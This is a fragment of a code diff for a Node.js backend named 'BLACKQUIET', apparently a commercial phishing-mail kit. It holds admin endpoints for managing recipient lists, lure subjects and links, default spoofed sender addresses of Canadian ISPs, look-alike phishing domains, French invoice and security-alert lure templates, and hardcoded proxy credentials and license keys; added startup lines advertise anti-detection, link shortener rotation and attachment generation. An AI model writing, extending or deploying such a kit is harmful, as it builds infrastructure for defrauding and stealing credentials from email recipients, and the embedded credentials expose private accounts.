-    if (names && Array.isArray(names)) globalLists.senderNames = names;
-    res.json({ success: true });
-});
-
-app.post('/api/admin/lists/subjects', checkLicense, requireAdmin, (req, res) => {
-    const { subjects } = req.body;
-    if (subjects && Array.isArray(subjects)) globalLists.subjects = subjects;
-    res.json({ success: true });
-});
-
-app.post('/api/admin/lists/links', checkLicense, requireAdmin, (req, res) => {
-    const { links } = req.body;
-    if (links && Array.isArray(links)) globalLists.links = links;
-    res.json({ success: true });
-});
-
-app.post('/api/admin/lists/recipients', checkLicense, requireAdmin, (req, res) => {
-    const { recipients } = req.body;
-    if (recipients && Array.isArray(recipients)) globalLists.recipients = recipients;
-    res.json({ success: true, count: globalLists.recipients.length });
-});
-
-app.post('/api/admin/templates', checkLicense, requireAdmin, (req, res) => {
-    const { templates } = req.body;
-    if (templates && Array.isArray(templates)) globalLists.templates = templates;
-    res.json({ success: true });
-});
-
-app.post('/api/admin/reset', checkLicense, requireAdmin, (req, res) => {
-    globalProxyConfig = {
-        proxy_host: process.env.PROXY_HOST || 'niceproxy.io',
-        proxy_port: parseInt(process.env.PROXY_PORT) || 17521,
-        proxy_user: process.env.PROXY_USER || 'black_rIxx-country-CA-isp-as11260_eastlink',
-        proxy_pass: process.env.PROXY_PASS || 'Kouame07',
-        smtp_host: process.env.SMTP_HOST || 'smtp.eastlink.ca',
-        smtp_port: parseInt(process.env.SMTP_PORT) || 25
-    };
-    globalLists = {
-        fromEmails: ['facture@eastlink.ca', 'admin@shaw.ca', 'support@bell.ca'],
-        senderNames: ['Service Client', 'Support Technique', 'Administration', 'Facturation'],
-        subjects: ['Facture impayée [INVOICE_NUM]', 'Alerte sécurité', 'Votre colis est bloqué'],
-        links: ['https://eastlink-secure.verification.com', 'https://shaw-paiement.urgence.net'],
-        templates: [
-            { name: 'Facture_Urgente.html', content: '<div><h2>Bonjour [FIRST_NAME],</h2><p>Votre facture <strong>[INVOICE_NUM]</strong> de <strong>[BALANCE_AMOUNT]</strong> expire le <strong>[DEADLINE_DATE]</strong>.</p><p><a href="[LINK]">Consulter</a></p></div>' },
-            { name: 'Alerte_securite.html', content: '<div><h2>Cher [REAL_NAME],</h2><p>Connexion suspecte depuis <strong>[IP_ADDRESS]</strong>.</p><p><a href="[LINK]">Vérifier</a></p></div>' }
-        ],
-        recipients: []
-    };
-    res.json({ success: true, message: 'Configuration réinitialisée' });
-});
-
-app.get('/api/admin/recipients', checkLicense, requireAdmin, (req, res) => {
-    res.json({ recipients: globalLists.recipients });
 });
 
 // ============ DÉMARRAGE ============
@@ -468,9 +568,12 @@ app.listen(PORT, () => {
     console.log('🚀 BLACKQUIET BACKEND v6.0 - COMPLET');
     console.log('========================================');
     console.log(`📡 Port: ${PORT}`);
-    console.log('👑 ADMIN: VALID-KEY-ABC123');
-    console.log('👤 USERS: PROD-KEY-001, PROD-KEY-002, PROD-KEY-003');
-    console.log(`🔌 Proxy: ${globalProxyConfig.proxy_host}:${globalProxyConfig.proxy_port}`);
-    console.log(`📧 SMTP: ${globalProxyConfig.smtp_host}:${globalProxyConfig.smtp_port}`);
+    console.log(`🔌 Proxy: ${PROXY_CONFIG.proxy_host}:${PROXY_CONFIG.proxy_port}`);
+    console.log(`📧 SMTP: ${PROXY_CONFIG.smtp_host}:${PROXY_CONFIG.smtp_port}`);
+    console.log(`🔄 Rotation SSID: ACTIVE`);
+    console.log(`🔗 Raccourcisseurs: TinyURL, is.gd, Cleanuri`);
+    console.log(`📄 Génération: PDF, DOCX`);
+    console.log(`🔍 DNS: Multi-niveaux`);
+    console.log(`🛡️ Anti-détection: ACTIVE`);
     console.log('========================================\n');
 });
